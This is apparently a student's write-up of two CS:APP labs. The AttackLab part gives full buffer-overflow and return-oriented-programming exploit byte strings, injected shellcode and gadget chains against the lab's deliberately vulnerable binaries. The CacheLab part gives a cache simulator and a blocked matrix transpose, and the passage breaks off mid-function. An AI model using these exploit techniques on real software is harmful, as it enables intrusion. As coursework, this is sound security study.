第四章的学习对我来说是一个巨大的挑战。当初计组考前突击刷了几年的原题，背了一些高频考点，侥幸拿了个93分，实际的水平只有自己知道。甚至一直没有弄明白流水线条件跳转指令如果分支预测错了究竟是怎样消除错误取指的影响，回到正确的位置继续运行，对旁路预取也只有一个概念性的了解。学完第四章，豁然开朗，心中埋藏已久的疑惑终才解开。其实还是能感觉到没有把流水线吃得很透，做家庭作业时明显感到有些吃力，不过哪怕过程磕磕绊绊，终究还是收获满满，对底层硬件的原理有了更深刻的理解

由衷地向硬件设计者们表达我的敬意

# AttackLab

## Level 1

`Phase 1`是一个简单直白的攻击，作为后续攻击的热身，只需照着说明手册上的提示一步步跟着做，即可将其破解

首先反汇编`touch1()`函数，获其地址为`0x4017c0`

```assembly
(gdb) disassemble touch1
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:		sub    $0x8,%rsp
   ......
```

接着反汇编`test()`函数

```assembly
(gdb) disassemble test
Dump of assembler code for function test:
   0x0000000000401968 <+0>:		sub    $0x8,%rsp
   0x000000000040196c <+4>:		mov    $0x0,%eax
   0x0000000000401971 <+9>:		callq  0x4017a8 <getbuf>
   0x0000000000401976 <+14>:	mov    %eax,%edx
   0x0000000000401978 <+16>:	mov    $0x403188,%esi
   0x000000000040197d <+21>:	mov    $0x1,%edi
   0x0000000000401982 <+26>:	mov    $0x0,%eax
   0x0000000000401987 <+31>:	callq  0x400df0 <__printf_chk@plt>
   0x000000000040198c <+36>:	add    $0x8,%rsp
   0x0000000000401990 <+40>:	retq   
End of assembler dump.
```

继续反汇编`getbuf()`函数

```assembly
(gdb) disassemble getbuf
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:		sub    $0x28,%rsp
   0x00000000004017ac <+4>:		mov    %rsp,%rdi
   0x00000000004017af <+7>:		callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	retq   
End of assembler dump.
```

由题意，需要通过栈溢出攻击，使得`getbuf()`函数调用retq语句返回目标地址从原本的`test()`函数体内转移至我们希望的`touch1()`函数。而`getbuf()`函数在栈上申请了40字节的缓冲区，反汇编`Gets()`函数后分析知它只是忠实地将用户输入字符串放置于缓冲区中，因此，只需先随意输入40个字符将缓冲区占满，再输入`touch1()`函数地址，修改`getbuf()`函数返回地址即可，因此，选择输入的文本如下

```
fez@papyruszzz:/mnt/d/repositories/CSAPP/Labs/AttackLab/target1$ cat ctarget1.txt 
01 02 03 04 05 06 07 08 09 10
01 02 03 04 05 06 07 08 09 10
01 02 03 04 05 06 07 08 09 10
01 02 03 04 05 06 07 08 09 10
c0 17 40 00 00 00 00 00
```

需注意的是内存地址为64位八字节长，因此`touch1()`函数首地址`0x4017c0`应补齐为`0x004017c0`，再按小端顺序排列

测试结果

```
fez@papyruszzz:/mnt/d/repositories/CSAPP/Labs/AttackLab/target1$ ./hex2raw < ctarget1.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:1:01 02 03 04 05 06 07 08 09 10 01 02 03 04 05 06 07 08 09 10 01 02 03 04 05 06 07 08 09 10 01 02 03 04 05 06 07 08 09 10 C0 17 40 00 
```

## Level 2

`Phase 2`在前一题的基础上稍微提升了一点难度。我的`cookie`值为`0x59b997fa`，反汇编获得`touch2()`函数首地址为`0x4017ec`，我们的注入代码应实现的功能为

```
1. 将cookie值写入%rdi寄存器
2. 调用touch2()函数
```

得代码

```
movq $0x59b997fa, %rdi
pushq $0x4017ec
retq
```

按说明文档步骤，通过`gcc -c tempfile.s`和`objdump tempfile.o > tempfile.d`得对应机器码

```
48 c7 fa 97 b9 59
68 ec 17 40 00
c3
```

通过gdb调试`ctarget`在`getbuf()`函数中打断点得输入字符串的首地址为`0x5561dc78`，故最终输入文本为

```
48 c7 c7 fa 97 b9 59
68 ec 17 40 00
c3
31 32 33 34 35 36 37
31 32 33 34 35 36 37 38 39 30
31 32 33 34 35 36 37 38 39 30
78 dc 61 55 00 00 00 00          
```

测试结果

```
fez@papyruszzz:/mnt/d/repositories/CSAPP/Labs/AttackLab/target1$ ./hex2raw < ctarget2.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 31 32 33 34 35 36 37 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 78 DC 61 55 
```

## Level 3

`Phase 3`需将值为`cookie`的字符串作为参数传递给`touch3()`函数，因`hexmatch()`函数内的指针`s`指向`cbuf`数组中的不确定位置，若按`Phase 2`中做法将注入代码与数据放于`getbuf()`函数申请的40个字节大小的缓存区内，则存在代码与数据被覆盖的可能。因此选择将注入代码与数据放于将要修改的`getbuf()`函数返回地址栈帧之上，即使用调用`getbuf()`函数的`test()`函数的栈帧来存储注入代码与数据，便可规避数据覆盖的风险

首先反汇编获得`touch3()`函数首地址为`0x4018fa`，我实验环境的`cookie`值为`0x59b997fa`，对应字符串为`35 39 62 39 39 37 66 61`，`getbuf()`函数返回地址存放在`0x5561dca0`处，则我们的代码应从`0x5561dca8`处开始，代码需要实现

```
1. 将字符串首地址传递给%rdi
2. 调用touch3()函数
```

得代码

```
movq 字符串首地址, %rdi		;48 c7 c7 xx xx xx xx
pushq $0x4018fa				;68 fa 18 40 00
retq						;c3

xx xx xx xx为待计算出的字符串首地址
```

选择将字符串数据放于注入代码之后，得输入文本

```
0x5561dc78:		31 32 33 34 35 36 37 38 	;填充
0x5561dc80:		39 30 31 32 33 34 35 36 	;填充
0x5561dc88:		37 38 39 30 31 32 33 34 	;填充
0x5561dc90: 	35 36 37 38 39 30 31 32 	;填充
0x5561dc98: 	33 34 35 36 37 38 39 30		;填充
0x5561dca0:		a8 dc 61 55 00 00 00 00		;返回地址
0x5561dca8:		48 c7 c7 xx xx xx xx 68		;代码
0x5561dcb0:		fa 18 40 00 c3 00 00 00		;代码
0x5561dcb8:		35 39 62 39 39 37 66 61		;字符串
```

观察知字符串首地址为`0x5561dcb8`，故最终文本为

```
31 32 33 34 35 36 37 38 39 30
31 32 33 34 35 36 37 38 39 30
31 32 33 34 35 36 37 38 39 30
31 32 33 34 35 36 37 38 39 30
a8 dc 61 55 00 00 00 00
48 c7 c7 b8 dc 61 55 68
fa 18 40 00 c3 00 00 00
35 39 62 39 39 37 66 61
```

测试结果

```
fez@papyruszzz:/mnt/d/repositories/CSAPP/Labs/AttackLab/target1$ ./hex2raw < ctarget3.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:3:31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 A8 DC 61 55 00 00 00 00 48 C7 C7 B8 DC 61 55 68 FA 18 40 00 C3 00 00 00 35 39 62 39 39 37 66 61 
```

## Level 2

思路：要想办法将`cookie`值传给`%rdi`寄存器，首先将该该值放于堆栈中一处，三种可选指令里只有`popq`指令能做到将堆栈中的值赋予寄存器，若能直接`popq %rdi`则皆大欢喜，若不能则需先将`cookie`值存于某一寄存器中，再通过`movq`指令将该值传入`%rdi`寄存器，最后调用`touch2()`函数实现最终目的

按照教学文档提示，在`start_farm()`和`mid_farm()`间寻找`movq X, %rdi`型字节码（`48 89 xx`），且该条指令之后立即跟上`nop`字节码（`90`）或`retq`字节码（`c3`），唯一的一条满足以上条件的指令在`setval_426()`函数中，首地址为`0x4019c5`，该指令实现`movq %rax, %rdi`，于是知应先将`cookie`值存于`%rax`寄存器中，即使用`popq %rax`指令，于是接着在`addval_219()`函数中地址为`0x4019ab`处寻得该指令

综上易得正确文本

```
31 32 33 34 35 36 37 38 39 30
31 32 33 34 35 36 37 38 39 30
31 32 33 34 35 36 37 38 39 30
31 32 33 34 35 36 37 38 39 30
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
c5 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

测试结果

```
fez@papyruszzz:/mnt/d/repositories/CSAPP/Labs/AttackLab/target1$ ./hex2raw < rtarget1.txt | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:rtarget:2:31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
```

## Level 3

`Phase 5`感觉比前四个难不少。首先我将从`start_farm()`到`end_farm()`内所有的函数的字节码全记在一张纸上，根据说明文档的`Figure`筛选出有用`gadget`如下（已剔除重复指令）

```
addval_273(): movq %rax, %rdi
addval_273(): movl %eax, %edi
getval_481(): movl %eax, %edx
addval_190(): movq %rsp, %rax
addval_190(): movl %esp, %eax
getval_159(): movl %edx, %ecx
```

{% asset_img attacklab_1.jpg %}

最开始尝试在所有函数中寻找是否有指令序列正好与待传送的`cookie`字符串值相等，但没找到。因为可用的只有`mov`和`pop`两类指令，条件限制严格，遂尝试寻找一个指令序列，先执行`mov`，接着执行`pop`，再调用`ret`

```
movq X, Y
pop Z
```

两条连着的指令，即机器码形如

```
89 xx 5x
```

若存在满足上述条件的指令序列，则可尝试通过前一句的`mov`指令将字符串首地址传在某寄存器中，同时`pop`指令跳过我们混合在代码中的字符串，但并不存在满足上述条件的指令。一度陷入迷茫。参考他人题解后方知有一重要信息没利用到

在这一堆`getval_xxx()`，`setval_xxx()`和`addval_xxx()`里，有一个特殊的函数：`add_xy()`，这个函数将`%rdi`寄存器和`%rsi`寄存器里的值相加，结果保存在`%rax`寄存器中，而我们又有一个唯一可用的的`pop`型指令`popq %rax`，结合能用的几种指令，想出如下办法（见图片右上角）

{% asset_img attacklab_2.jpg %}

得输入序列

```
31 32 33 34 35 36 37 38 39 30
31 32 33 34 35 36 37 38 39 30
31 32 33 34 35 36 37 38 39 30
31 32 33 34 35 36 37 38 39 30
ab 19 40 00 00 00 00 00
20 00 00 00 00 00 00 00
dd 19 40 00 00 00 00 00
34 1a 40 00 00 00 00 00
13 1a 40 00 00 00 00 00
06 1a 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61
```

测试答案

```
fez@papyruszzz:/mnt/d/repositories/CSAPP/Labs/AttackLab/target1$ ./hex2raw < rtarget2.txt | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:rtarget:3:31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 AB 19 40 00 00 00 00 00 20 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 
```

## 小结

总的来说,`attacklab`的五个`phase`难度都不很大。能有机会做一次“黑客”还是挺酷的，通过使用`CI`和`ROP`方法对程序进行缓冲区溢出攻击，更能深刻体会限制缓存区长度、对程序各种可能的输入的周全考虑必要性。

# CacheLab

## Part A

说实话这部分给我带来的挑战感觉并不很大，感觉自己逻辑是对的但检查来检查去就是得不到预期答案，哪怕参考他人代码核对后仍然觉得自己的没问题，实在是过于折磨......

因为我是把整本书全看完才开始做这个实验的，而这一部分涉及文件读取，我一上来就想到了使用第十章中学到的`dup2()`函数将标准输入重定向到文件，再尝试`scanf()`读入，但不知为何就是不停报错`Segmentation fault`，检查多次修改多处仍不能正常运行，遂参考他人思路，利用`fgets()`逐行读入数据再逐字符分析，最终版本如下

```c
#include "cachelab.h"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <getopt.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <limits.h>

#define MAXBUF 128					/* 缓冲区大小 */
#define IDX(m, n, E) m * E + n		/* 计算m行n列元素位置 */

void help(char *argv[]);
void load_store(int count, unsigned tag, unsigned index, unsigned offset, unsigned size, int E);
int hextodec(char c);				/* 十六进制转十进制 */
void print(char buf[]);

int hit_count = 0, miss_count = 0, eviction_count = 0;
int v = 0;							/* v代表是否开启详细显示模式 */
char buffer[MAXBUF];				/* 读取缓冲区 */
FILE *fp;							
typedef struct {
	int valid;						/* 有效位 */
	int tag;
	int count;						/* count值越大，说明最近被使用 */
}unit;								/* 一个unit单元即为cache中一行 */
unit* cache;

int main(int argc, char *argv[])
{
	char opt;
	unsigned int s = 0, E = 0, b = 0, s_pow = 0;
	while ((opt = getopt(argc, argv, "hvs:E:b:t:")) != -1) {
		switch(opt) {
			case 'h':
				help(argv);
				return 0;
			case 'v':
				v = 1;
				break;
			case 's':
				s = atoi(optarg);
				s_pow = 1 << s;
				break;
			case 'E':
				E = atoi(optarg);
				break;
			case 'b':
				b = atoi(optarg);
				break;
			case 't':
				if ((fp = fopen(optarg, "r")) == NULL) {
					printf("ERROR!%s open failed!\n", optarg);
					exit(1);
				}
				break;
			case '?':
				help(argv);
				return 0;
		}
	}
	if (s == 0 || E == 0 || b == 0) {
		printf("%s: Missing required command line argument\n", argv[0]);
		help(argv);
		return 0;
	}
	cache = (unit*)malloc(16 * s_pow * E);		/* 16是因为考虑了对齐 */
	for (int i = 0; i < s_pow * E; i++) {
		cache[i].valid = cache[i].tag = cache[i].count = 0;
	}
	
	int count = 0;
	while (fgets(buffer, MAXBUF, fp)) {			/* 逐行分析 */
		char c;
		int op = 0, comma = 0;
		unsigned int offset = 0, tag = 0, index = 0;
		unsigned int size = 0, address = 0;
		count++;

		for (int i = 0; (c = buffer[i]) && (c != '\n'); i++) {
			if (c == ' ') continue;
			else if (c == 'I') op = 0;
			else if (c == 'L' || c == 'S') op = 1;
			else if (c == 'M') op = 2;
			else if (c == ',') comma = 1;
			else {
				if (comma)	size = hextodec(c);	/* 当读取到逗号时，之后的数据是size大小 */
				else		address = 16 * address + hextodec(c);
			}
		}

		for (int i = 0; i < b; i++) {			/* 实际上offset在本实验中没用，可以抛弃 */
			offset = offset * 2 + address % 2;
			address >>= 1;
		}

		for (int i = 0; i < s; i++) {
			index = index * 2 + address % 2;
			address >>= 1;
		}

		tag = address;

		if (v && op)
			print(buffer);
		if (op == 1) {
			load_store(count, tag, index, offset, size, E);
			if (v) printf("\n");
		}
			
		if (op == 2) {
			load_store(count, tag, index, offset, size, E);
			hit_count++;
			if (v)	printf(" hit\n");
		}
	}	

	free(cache);
	fclose(fp);
	printSummary(hit_count, miss_count, eviction_count);
	return 0;
}

void help(char *argv[]) {
	printf("Usage: %s [-hv] -s <num> -E <num> -b <num> -t <file>\n", argv[0]);
	printf("Options:\n");
	printf("  -h\t\tPrint this help message.\n");
	printf("  -v\t\tOptional verbose flag.\n");
	printf("  -s <num>\tNumber of set index bits.\n");
	printf("  -E <num>\tNumber of lines per set.\n");
	printf("  -b <num>\tNumber of block offset bits.\n");
	printf("  -t <file>\tTrace file.\n\n");
	printf("Examples:\n");
	printf("  linux>  %s -s 4 -E 1 -b 4 -t traces/yi.trace\n", argv[0]);
	printf("  linux>  %s -v -s 8 -E 2 -b 4 -t traces/yi.trace\n", argv[0]);
}

void load_store(int count, unsigned tag, unsigned index, unsigned offset, unsigned size, int E) {
	//is it already in the cache?
	for (int i = 0; i < E; i++) {
		if (cache[IDX(index, i, E)].tag == tag && cache[IDX(index, i, E)].valid) {
			cache[IDX(index, i, E)].count = count;
			hit_count++;
			if (v) printf(" hit");
			return;
		}
	}
	
	miss_count++;
	if (v) printf(" miss");
	//is set already full?
	for (int i = 0; i < E; i++) {
		if (!cache[IDX(index, i, E)].valid) {
			cache[IDX(index, i, E)].valid = 1;
			cache[IDX(index, i, E)].tag = tag;
			cache[IDX(index, i, E)].count = count;
			return;
		}
	}
	
	//full
	int min_index = 0, min_count = INT_MAX;
	for (int i = 0; i < E; i++) {
		if (cache[IDX(index, i, E)].count < min_count) {
			min_count = cache[IDX(index, i, E)].count;
			min_index = i;
		}
	}
	cache[IDX(index, min_index, E)].tag = tag;
	cache[IDX(index, min_index, E)].count = count;
 	eviction_count++;
	if (v) printf(" eviction");
}	

int hextodec(char c) {
	if (c >= '0' && c <= '9') {
    	return c - '0';
  	}
  	if (c >= 'A' && c <= 'F') {
    	return c - 'A' + 10;
  	}
  	if (c >= 'a' && c <= 'f') {
    	return c - 'a' + 10;
  	}
  	return 0;
}

void print(char buf[]) {
	for (int i = 0; buf[i] != '\n'; i++)
		printf("%c", buf[i]);
}
```

使用

```
unix> make clean
unix> make
unix> ./test-csim
```

进行测试，注意不要自行定义`printSummary()`函数，该函数在`cachelab.h`中声明，在`cachelab.c`中定义，无需自行声明定义

## Part B

此时此刻，相较于写单纯地写试验记录，我更想记录下做`Part B`这部分的心路历程。可以说，`Part B`部分是目前做过的所有实验里最麻烦、最困难、最坑的，我必须得承认在过去的几天我被折磨得很难受，甚至在昨天回学校的飞机上我也一直在想解题思路，看了很多题解加上心无旁骛的弄了很久才终于将终于得出满分答案。但直到现在做出来我还是很沮丧的，因为`CacheLab`两个部分我都没能独立完成。`Part A`按自己方法做出来但是就是无法正常运行，`Part B`阅读完网络旁注的提示也没有丝毫头绪，于是看别人题解，看一眼，感觉懂了，有思路了，又自己做，又无从下手，又看，只看个大概，又觉得自己懂了，又自己做，又卡住......这种轮回在过去的三天至少发生了十多次。很多时候看了题解有了思路，反思自己，其实再多想想也未必想不到，但就是想要依赖现成的、“完全正确的”答案，哪怕最后做出来了，也不是靠自己的思考与实践弄出来的，总是心情低落。又鉴于此部分坑多题难，于是想要好好写一写题解，用自己的话、自己的理解把一切东西都说清楚，才算真正做懂了这个实验

首先想要提醒的是这个实验的一个究极大坑：当完成`trans.c`程序后，按照实验文档说明检验自己的程序

```
unix> make clean
unix> make
unix> ./test-trans -M 64 -N 64
```

发现这个`test-trans`程序运行极慢，需要几十秒甚至几分钟才能出结果，而且最后弹出一个超时错误

```
Step 1: Validating and generating memory traces
Error: Program timed out.
```

呵呵，一开始我也没觉得有啥不对劲，单纯以为这个程序就是跑得很慢，或者显示超时可能是我的代码逻辑出错了。但是哪怕我使用别人题解里正确的、通过测试的代码，在我的机器上仍是超时，而在别人的机器上则能轻松通过。上网查了一下这个问题，相关回答很少，但有一个管用的解决方法：将解压出来的文件夹放到`linux`系统的桌面，即可正常运行。具体是什么原因导致的这个大坑我也没弄清楚，但此方法是可行的，至此我才知此前我检测答案时动辄三五分钟的运行时间，还只能得到一个`Program timed out`错误是有多离谱

接下来分析一下具体实验内容，这里结合我几次想当然走而犯的错，提醒一下，**必须要仔细审题**，首先，这个部分的`cache`采用的是直接映射替换策略（我当初想当然以为是全相联，说多了都是泪），`cache`一共`32`组，一组一行，而一行又可存储`32`个字节。因为本题是求`int`型矩阵的转置，而一个`int`是四字节大小，**因此`cache`中一行最多能存八个矩阵元素**，整个`cache`最多能存储`256`个矩阵元素

本题只有三个测试矩阵

```
32 x 32(M = 32, N = 32)
64 x 64(M = 64, N = 64)
61 x 67(M = 61, N = 67)
```

且A矩阵是N行M列，B矩阵是M行N列，先讨论`32 x 32`大小的矩阵

在继续向下前确保你已阅读[这篇文章]([waside-blocking.dvi (cmu.edu)](http://csapp.cs.cmu.edu/public/waside/waside-blocking.pdf))并理解其原理

### 32 x 32

要完成对一个矩阵进行转置，这是实验自带的一个解答

```c
void trans(int M, int N, int A[N][M], int B[M][N])
{
    int i, j, tmp;

    for (i = 0; i < N; i++) {
        for (j = 0; j < M; j++) {
            tmp = A[i][j];
            B[j][i] = tmp;
        }
    }    

}
```

程序正确性一目了然，但缺失率呢？

```
Function 0 (1 total)
Step 1: Validating and generating memory traces
Step 2: Evaluating performance (s=5, E=1, b=5)
func 0 (Simple row-wise scan transpose): hits:870, misses:1183, evictions:1151
```

此题若要拿到满分，需要将`misses`降到300以下，显然此方法缺失率过高。究其原因，上述代码并未很好利用空间局限性性质，试想第一次访问`A[0][0]`元素时，冷不命中，于是将`A[0][0]`至`A[0][7]`元素加载于`cache`同一行中，对于A数组放在同一个`set`中的八个元素，八次访问中，缺失一次，命中七次，命中率尚可。但若考虑B数组，B数组按列访问，`B[0][0]`与`B[1][0]`之间隔了31个元素，若`B[0][0]`映射于`set 0`中，冷不命中，则`B[1][0]`映射于`set 4`中，冷不命中，`B[2][0]`映射于`set 7`中，冷不命中，......，`B[7][0]`映射于`set 28`中，而此时若访问`B[8][0]`，由于只有32个组，因此`B[8][0]`又将映射到`set 0`中，将原本`B[0][0]`等元素覆盖掉，访问`B[9][0]`也会将`B[1][0]`所在组的元素全覆盖掉，每一次访问都不命中。因此，`32 x 32`型矩阵，B数组最多连续八列于`cache`中。即如果我们将B数组的连续八列放于`cache`中，刚好不会互相覆盖，然后将这八列所在的八个`set`均填满，就能像访问A数组一样做到连续八个元素的访问中七次命中，一次缺失，代码如下

```c
void trans0(int M, int N, int A[N][M], int B[M][N])
{
	int i, j, ii, a0, a1, a2, a3, a4, a5, a6, a7;
	for (i = 0; i < N; i += 8) {
		for (j = 0; j < M; j += 8) {
			for (ii = i; ii < i + 8; ii++) {
				a0 = A[ii][j + 0];
				a1 = A[ii][j + 1];
				a2 = A[ii][j + 2];
				a3 = A[ii][j + 3];
				a4 = A[ii][j + 4];
				a5 = A[ii][j + 5];
				a6 = A[ii][j + 6];
				a7 = A[ii][j + 7];
				B[j + 0][ii] = a0;
				B[j + 1][ii] = a1;
				B[j + 2][ii] = a2;
				B[j + 3][ii] = a3;
				B[j + 4][ii] = a4;
				B[j + 5][ii] = a5;
				B[j + 6][ii] = a6;
				B[j + 7][ii] = a7;
			}
		}
	}
}
```

建议拿上纸和笔演算一下。上述代码将矩阵分成`8 x 8`的块，对每块分别进行转置，实际上利用的就是网络旁注文章中介绍的思想。该函数测试结果如下

```
Function 1 (2 total)
Step 1: Validating and generating memory traces
Step 2: Evaluating performance (s=5, E=1, b=5)
func 1 (Improved version 1): hits:1766, misses:287, evictions:255
```

已达到本题满分要求

按上述思路，理想状态下缺失数应为`(8 + 8) * 16 = 256`次，`8 + 8`代表一个`8 x 8`的小块里A矩阵八次缺失加上B矩阵八次缺失，`16`为块数目。而我们缺失次数为`287`，多了31次，深入分析发现转置位于矩阵对角线上的元素会带来额外一次缺失，例如，初始访问`A[0][0]`，冷不命中，将`A[0][0]`至`A[0][7]`加载至`set 0`中，接着将`B[0][0]`至`B[7][0]`加载于`cache`中。理想情况下，B数组加载至`cache`中的`set`应该一直在缓存里，不被换出，直至全部填满。但考虑当访问A数组至`A[1][0]`元素开头的八个元素时，这些元素将会映射到`B[1][0]`所处的`set`中，将其覆盖，当后续再度访问`B[1][0]`等元素时，将发生缺失。这是我们不愿意看到的，考虑是否有方法可以避免这样的“悲剧”发生呢？

梳理一下问题，即若我们先将B数组的各列加载于`cache`中，在访问A数组过程中将会把某些B数组已加载的值覆盖掉。要避免覆盖的发生，只有想办法在访问A数组对应列之前，不访问后续B数组的列。例如，如果我们先将`B[5][0]`所在行加载于`cache`，当A数组访问至`A[5][0]`时，将其覆盖，后续再访问`B[5][0]`所在`set`内的元素将发生一次缺失。而`A[5][0]`至`A[5][7]`只会加载入缓存一次，待这次加载后再将`B[5][0]`至`B[5][7]`加载入缓存，不再可能发生覆盖，问题得到解决。

因此，我们得将A数组获得的、属于后续B数组列的值暂存在某个地方，待时机成熟后再让暂存的值回归正确位置，具体做法请见代码

```c
for (i = 0; i < N; i += 8) {
    for (j = 0; j < M; j += 8) {
        if (i == j) { // i, j值相等，对角线位于此块内
            a0 = A[i + 0][j + 0], a1 = A[i + 0][j + 1], a2 = A[i + 0][j + 2], a3 = A[i + 0][j + 3];
            a4 = A[i + 0][j + 4], a5 = A[i + 0][j + 5], a6 = A[i + 0][j + 6], a7 = A[i + 0][j + 7];
            B[i + 0][j + 0] = a0, B[i + 0][j + 1] = a1, B[i + 0][j + 2] = a2, B[i + 0][j + 3] = a3;
            B[i + 0][j + 4] = a4, B[i + 0][j + 5] = a5, B[i + 0][j + 6] = a6, B[i + 0][j + 7] = a7;

            a0 = A[i + 1][j + 0], a1 = A[i + 1][j + 1], a2 = A[i + 1][j + 2], a3 = A[i + 1][j + 3];
            a4 = A[i + 1][j + 4], a5 = A[i + 1][j + 5], a6 = A[i + 1][j + 6], a7 = A[i + 1][j + 7];
            B[i + 1][j + 0] = B[i + 0][j + 1], B[i + 0][j + 1] = a0;
            B[i + 1][j + 1] = a1, B[i + 1][j + 2] = a2, B[i + 1][j + 3] = a3;
            B[i + 1][j + 4] = a4, B[i + 1][j + 5] = a5, B[i + 1][j + 6] = a6, B[i + 1][j + 7] = a7;

            a0 = A[i + 2][j + 0], a1 = A[i + 2][j + 1], a2 = A[i + 2][j + 2], a3 = A[i + 2][j + 3];
            a4 = A[i + 2][j + 4], a5 = A[i + 2][j + 5], a6 = A[i + 2][j + 6], a7 = A[i + 2][j + 7];
            B[i + 2][j + 0] = B[i + 0][j + 2], B[i + 0][j + 2] = a0;
            B[i + 2][j + 1] = B[i + 1][j + 2], B[i + 1][j + 2] = a1;
            B[i + 2][j + 2] = a2, B[i + 2][j + 3] = a3;
            B[i + 2][j + 4] = a4, B[i + 2][j + 5] = a5, B[i + 2][j + 6] = a6, B[i + 2][j + 7] = a7;

            a0 = A[i + 3][j + 0], a1 = A[i + 3][j + 1], a2 = A[i + 3][j + 2], a3 = A[i + 3][j + 3];
            a4 = A[i + 3][j + 4], a5 = A[i + 3][j + 5], a6 = A[i + 3][j + 6], a7 = A[i + 3][j + 7];
            B[i + 3][j + 0] = B[i + 0][j + 3], B[i + 0][j + 3] = a0;
            B[i + 3][j + 1] = B[i + 1][j + 3], B[i + 1][j + 3] = a1;
            B[i + 3][j + 2] = B[i + 2][j + 3], B[i + 2][j + 3] = a2;
            B[i + 3][j + 3] = a3;
            B[i + 3][j + 4] = a4, B[i + 3][j + 5] = a5, B[i + 3][j + 6] = a6, B[i + 3][j + 7] = a7;

            a0 = A[i + 4][j + 0], a1 = A[i + 4][j + 1], a2 = A[i + 4][j + 2], a3 = A[i + 4][j + 3];
            a4 = A[i + 4][j + 4], a5 = A[i + 4][j + 5], a6 = A[i + 4][j + 6], a7 = A[i + 4][j + 7];
            B[i + 4][j + 0] = B[i + 0][j + 4], B[i + 0][j + 4] = a0;
            B[i + 4][j + 1] = B[i + 1][j + 4], B[i + 1][j + 4] = a1;
            B[i + 4][j + 2] = B[i + 2][j + 4], B[i + 2][j + 4] = a2;
            B[i + 4][j + 3] = B[i + 3][j + 4], B[i + 3][j + 4] = a3;
            B[i + 4][j + 4] = a4, B[i + 4][j + 5] = a5, B[i + 4][j + 6] = a6, B[i + 4][j + 7] = a7;

            a0 = A[i + 5][j + 0], a1 = A[i + 5][j + 1], a2 = A[i + 5][j + 2], a3 = A[i + 5][j + 3];
            a4 = A[i + 5][j + 4], a5 = A[i + 5][j + 5], a6 = A[i + 5][j + 6], a7 = A[i + 5][j + 7];
            B[i + 5][j + 0] = B[i + 0][j + 5], B[i + 0][j + 5] = a0;
            B[i + 5][j + 1] = B[i + 1][j + 5], B[i + 1][j + 5] = a1;
            B[i + 5][j + 2] = B[i + 2][j + 5], B[i + 2][j + 5] = a2;
            B[i + 5][j + 3] = B[i + 3][j + 5], B[i + 3][j + 5] = a3;
            B[i + 5][j + 4] = B[i + 4][j + 5], B[i + 4][j + 5] = a4;
            B[i + 5][j + 5] = a5, B[i + 5][j + 6] = a6, B[i + 5][j + 7] = a7;

            a0 = A[i + 6][j + 0], a1 = A[i + 6][j + 1], a2 = A[i + 6][j + 2], a3 = A[i + 6][j + 3];
            a4 = A[i + 6][j + 4], a5 = A[i + 6][j + 5], a6 = A[i + 6][j + 6], a7 = A[i + 6][j + 7];
            B[i + 6][j + 0] = B[i + 0][j + 6], B[i + 0][j + 6] = a0;
            B[i + 6][j + 1] = B[i + 1][j + 6], B[i + 1][j + 6] = a1;
            B[i + 6][j + 2] = B[i + 2][j + 6], B[i + 2][j + 6] = a2;
            B[i + 6][j + 3] = B[i + 3][j + 6], B[i + 3][j + 6] = a3;
            B[i + 6][j + 4] = B[i + 4][j + 6], B[i + 4][j + 6] = a4;
            B[i + 6][j + 5] = B[i + 5][j + 6], B[i + 5][j + 6] = a5;
            B[i + 6][j + 6] = a6, B[i + 6][j + 7] = a7;

            a0 = A[i + 7][j + 0], a1 = A[i + 7][j + 1], a2 = A[i + 7][j + 2], a3 = A[i + 7][j + 3];
            a4 = A[i + 7][j + 4], a5 = A[i + 7][j + 5], a6 = A[i + 7][j + 6], a7 = A[i + 7][j + 7];
